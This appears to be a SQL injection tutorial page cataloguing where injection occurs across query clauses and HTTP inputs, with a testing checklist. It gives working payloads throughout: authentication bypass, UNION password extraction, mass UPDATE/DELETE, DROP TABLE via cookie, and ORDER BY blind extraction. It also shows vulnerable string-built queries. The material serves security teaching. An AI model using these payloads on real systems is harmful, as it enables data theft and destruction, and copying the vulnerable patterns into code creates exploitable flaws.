# Common SQL Injection Locations

SQL injection can occur in any part of a query where user input is incorporated. Understanding where to look for vulnerabilities is crucial for both attackers and defenders.

## Query Clause Locations

### 1. WHERE Clause (Most Common)

The WHERE clause is the most frequent location for SQL injection vulnerabilities.

**Vulnerable Query:**
```sql
SELECT * FROM products WHERE category = 'USER_INPUT'
```

**Injection:**
```sql
' OR '1'='1'--
```

**Resulting Query:**
```sql
SELECT * FROM products WHERE category = '' OR '1'='1'--'
```

**Impact:** Retrieves all records instead of filtered results

---

### 2. SELECT Clause

Injection in the column names or expressions.

**Vulnerable Query:**
```sql
SELECT name, price FROM products WHERE id = 1
```

**Injection (Less Common):**
```sql
-- If column name is user-controlled
SELECT USER_INPUT FROM products WHERE id = 1
```

**Example:**
```sql
SELECT name, (SELECT password FROM users WHERE id=1) FROM products WHERE id = 1
```

---

### 3. FROM Clause

Injection in table names.

**Vulnerable Query:**
```sql
SELECT * FROM USER_INPUT WHERE status = 'active'
```

**Injection:**
```sql
users WHERE 1=1--
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE 1=1-- WHERE status = 'active'
```

---

### 4. ORDER BY Clause

Very common in sorting functionality.

**Vulnerable Query:**
```sql
SELECT * FROM products ORDER BY USER_INPUT
```

**Detection:**
```sql
-- Test for SQLi
1 -- Normal
(SELECT 1) -- If works, likely vulnerable
1,(SELECT 1 FROM users) -- Enumerate tables
```

**Exploitation:**
```sql
-- Boolean-based extraction
(CASE WHEN (1=1) THEN name ELSE price END)
```

**Note:** Cannot use UNION in ORDER BY, must use conditional techniques

---

### 5. INSERT Statement

Injection in values being inserted.

**Vulnerable Query:**
```sql
INSERT INTO users (username, email) VALUES ('USER_INPUT', 'USER_INPUT')
```

**Injection:**
```sql
admin', 'admin@evil.com'), ('hacker', 'hacker@evil.com')--
```

**Resulting Query:**
```sql
INSERT INTO users (username, email) VALUES ('admin', 'admin@evil.com'), ('hacker', 'hacker@evil.com')--', 'USER_INPUT')
```

---

### 6. UPDATE Statement

Injection in updated values or WHERE clause.

**Vulnerable Query:**
```sql
UPDATE users SET email = 'USER_INPUT' WHERE id = 1
```

**Injection in Value:**
```sql
test@email.com', password='newpass' WHERE username='admin'--
```

**Resulting Query:**
```sql
UPDATE users SET email = 'test@email.com', password='newpass' WHERE username='admin'--' WHERE id = 1
```

**Vulnerable WHERE Clause:**
```sql
UPDATE users SET email = 'new@email.com' WHERE username = 'USER_INPUT'
```

**Dangerous Injection:**
```sql
' OR '1'='1'--
```

**Resulting Query:**
```sql
UPDATE users SET email = 'new@email.com' WHERE username = '' OR '1'='1'--'
-- This updates ALL records!
```

---

### 7. DELETE Statement

Extremely dangerous when vulnerable.

**Vulnerable Query:**
```sql
DELETE FROM messages WHERE id = USER_INPUT
```

**Injection:**
```sql
1 OR 1=1
```

**Resulting Query:**
```sql
DELETE FROM messages WHERE id = 1 OR 1=1
-- Deletes ALL messages!
```

---

### 8. LIMIT/OFFSET Clause

**Vulnerable Query:**
```sql
SELECT * FROM products LIMIT USER_INPUT, 10
```

**Injection:**
```sql
1 UNION SELECT null, username, password, null FROM users--
```

---

### 9. GROUP BY Clause

**Vulnerable Query:**
```sql
SELECT category, COUNT(*) FROM products GROUP BY USER_INPUT
```

**Injection:**
```sql
category; UPDATE users SET password='hacked' WHERE username='admin'--
```

---

## Application Context Locations

### 1. URL Parameters (GET)

**Example:**
```
https://example.com/products?id=1
https://example.com/search?q=laptop
https://example.com/user?name=john
```

**Testing:**
```
?id=1'
?id=1 OR 1=1--
?id=1 UNION SELECT NULL--
```

---

### 2. Form Fields (POST)

**Common Fields:**
- Login forms (username, password)
- Search boxes
- Registration forms
- Contact forms
- Comment fields

**Example:**
```html
<form method="POST">
    <input name="username" value="admin'--">
    <input name="password" value="anything">
</form>
```

---

### 3. HTTP Headers

**Vulnerable Headers:**
- User-Agent
- Referer
- Cookie
- X-Forwarded-For

**Example:**
```
Cookie: session_id=abc123'; DROP TABLE users--
User-Agent: Mozilla/5.0' UNION SELECT password FROM users--
```

---

### 4. JSON Parameters

**Request:**
```json
{
    "username": "admin'--",
    "search": "' OR '1'='1"
}
```

**Vulnerable Code:**
```python
data = json.loads(request.body)
query = f"SELECT * FROM users WHERE username = '{data['username']}'"
```

---

### 5. XML Parameters

**Request:**
```xml
<user>
    <username>admin'--</username>
    <password>pass123</password>
</user>
```

**Evasion Technique:**
```xml
<user>
    <username>&#x61;dmin'--</username>  <!-- 'a' encoded -->
</user>
```

---

### 6. Cookie Values

**Cookie:**
```
session=123; tracking_id=xyz' UNION SELECT password FROM users--
```

**Vulnerable Query:**
```sql
SELECT * FROM sessions WHERE tracking_id = 'COOKIE_VALUE'
```

---

## Location-Based Testing Strategy

### Priority 1: High-Risk Locations
1. Login forms (authentication bypass)
2. Search functionality (data retrieval)
3. URL parameters (easy to test)
4. WHERE clauses (most common)

### Priority 2: Medium-Risk Locations
1. ORDER BY clauses (limited exploitation)
2. UPDATE statements (modification attacks)
3. Cookie values (session-based attacks)
4. HTTP headers (less common but possible)

### Priority 3: Advanced Locations
1. INSERT statements (second-order potential)
2. JSON/XML inputs (require format knowledge)
3. Stored procedures (complex)
4. Second-order injection points

## Testing Checklist by Location

### For Each Input Point:

1. **Identify the input location**
   - [ ] URL parameter
   - [ ] Form field
   - [ ] HTTP header
   - [ ] Cookie
   - [ ] JSON/XML

2. **Test for vulnerability**
   - [ ] Single quote `'`
   - [ ] Double quote `"`
   - [ ] SQL comment `--`
   - [ ] Boolean conditions `' OR '1'='1`

3. **Determine query context**
   - [ ] WHERE clause
   - [ ] ORDER BY clause
   - [ ] INSERT values
   - [ ] UPDATE values
   - [ ] Other

4. **Exploit appropriately**
   - [ ] UNION attack (if visible results)
   - [ ] Boolean blind (if behavior changes)
   - [ ] Time-based blind (if no changes)
   - [ ] Error-based (if errors visible)

## Dangerous Combinations

### ⚠️ UPDATE + WHERE with OR 1=1
```sql
-- Can modify ALL records
UPDATE users SET email='hacked@evil.com' WHERE id = '1' OR '1'='1'
```

### ⚠️ DELETE + WHERE with OR 1=1
```sql
-- Can delete ALL records
DELETE FROM products WHERE category = '' OR '1'='1'
```

### ⚠️ INSERT with Multiple Values
```sql
-- Can insert multiple malicious records
INSERT INTO comments (text) VALUES ('test'), ('spam'), ('more spam')
```

## Real-World Examples

### Example 1: E-commerce Product Filter
```sql
-- Vulnerable
SELECT * FROM products WHERE category = '$_GET[category]' AND price < 100

-- Attack
?category=' OR 1=1--

-- Result: Shows all products regardless of price
```

### Example 2: User Profile Update
```sql
-- Vulnerable
UPDATE profiles SET bio = '$_POST[bio]' WHERE user_id = $uid

-- Attack
bio: ', admin=1 WHERE user_id=5--

-- Result: Can escalate privileges
```

### Example 3: Search Functionality
```sql
-- Vulnerable
SELECT * FROM articles WHERE title LIKE '%$search%' ORDER BY $_GET[sort]

-- Attack
?sort=(CASE WHEN (SELECT username FROM users WHERE id=1)='admin' THEN title ELSE date END)

-- Result: Boolean-based data extraction through ORDER BY
```

## Key Takeaways

1. **WHERE clause** is most common but not the only location
2. **ORDER BY** is often overlooked but frequently vulnerable
3. **UPDATE and DELETE** can be catastrophic if vulnerable
4. **Second-order** vulnerabilities occur when stored data is used unsafely
5. **All inputs** (GET, POST, Cookie, Headers) should be tested
6. **Different locations** require different exploitation techniques

## Next Steps

- Learn [Retrieval Techniques](../02-exploitation/retrieving-hidden-data.md)
- Study [UNION Attacks](../02-exploitation/union-attacks.md)
- Master [Blind SQLi](../03-blind-sqli/)

---

**Always test responsibly and with authorization!**
